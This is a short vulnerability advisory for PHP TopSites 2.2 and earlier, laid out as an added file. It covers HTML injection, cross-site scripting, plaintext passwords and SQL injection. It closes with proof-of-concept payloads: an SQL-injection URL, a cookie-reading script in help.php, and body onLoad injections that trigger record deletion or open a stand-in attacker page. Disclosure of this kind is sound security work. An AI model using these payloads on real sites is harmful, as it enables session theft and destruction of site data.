@@ -1,0 +1,48 @@
+PHP Topsites Multiple Vulnerabilities
+
+Vendor: iTop 10
+Product: PHP Topsites
+Version: <= 2.2
+Website: http://www.itop10.net/
+
+BID: 6621 6622 6623 6625 
+
+Description:
+PHP TopSites is a PHP/MySQL-based customizable TopList script. Main features include: Easy configuration config file; MySQL database backend; unlimited categories, Site rating on incoming votes; Special Rating from Webmaster; anti-cheating gateway; Random link; Lost password function; Webmaster Site-approval; Edit site; ProcessingTime display; Cookies Anti-Cheating; Site Reviews; Linux Cron Free; Frame Protection and much more. 
+
+Script Injection Vulnerability:
+An HTML injection vulnerability has been discovered in PHP TopSites. The issue occurs due to insufficient sanitization of user-supplied data. By injecting HTML code into the <body> tag of the description page, when submitting website, it may be possible to cause an administrator to edit or delete database entries. This issue will occur when an unsuspecting administrator loads the submitted description. This vulnerability also affects the 'edit.php' script. 
+
+Cross Site Scripting Vulnerability:
+A vulnerability has been discovered in PHP TopSites. Due to invalid sanitization of user-supplied input by the 'help.php' script, it may be possible for an attacker to steal another users cookie information or other sensitive data. This issue can be exploited by constructing a malicious URL containing embedded script code as a 'help.php' parameter. When an unsuspecting user follows the link sensitive information, such as cookie-based authentication credentials may be obtained by the attacker. 
+
+Plaintext Password Weakness:
+A weakness has been discovered in PHP TopSites. It has been reported that user's passwords are stored in plaintext and thus are visible to TopSites administrators. This poses a security risk as TopSite script users may use the same passwords on other systems. 
+
+SQL Injection Vulnerability:
+A vulnerability has been discovered in PHP TopSites. Due to insufficient sanitization of user-supplied URI parameters it is possible for an attacker to embed SQL commands into certain page requests. This may result in database information being disclose to an attacker. 
+
+Solution:
+Upgrade to the current version of php topsites 
+
+Proof Of Conecpt Exploit:
+iTop10.net phpTopsites Proof Of Concept 
+
+Credits:
+James Bercegay of the GulfTech Security Research Team. And The CyberArmy ACAT Team.
+
+
+
+
+
+- https://www.securityfocus.com/bid/6625/info
+http://examplewebsite.com/topsitesdirectory/edit.php?a=pre&submit=&sid=siteidnumber--
+
+- https://www.securityfocus.com/bid/6623/info
+
+- https://www.securityfocus.com/bid/6622/info
+http://www.example.com/TopSitesdirectory/help.php?sid=<script>alert(document.cookie)</script>
+
+- https://www.securityfocus.com/bid/6621/info
+<body onLoad= "parent.location='http://www.somewebsite.com/TopSitesdirectory/seditor.php?sid=siteidnumber&a=delete'">
+<body onLoad="window.open('http://attackerswebsite/launcher.htm')">
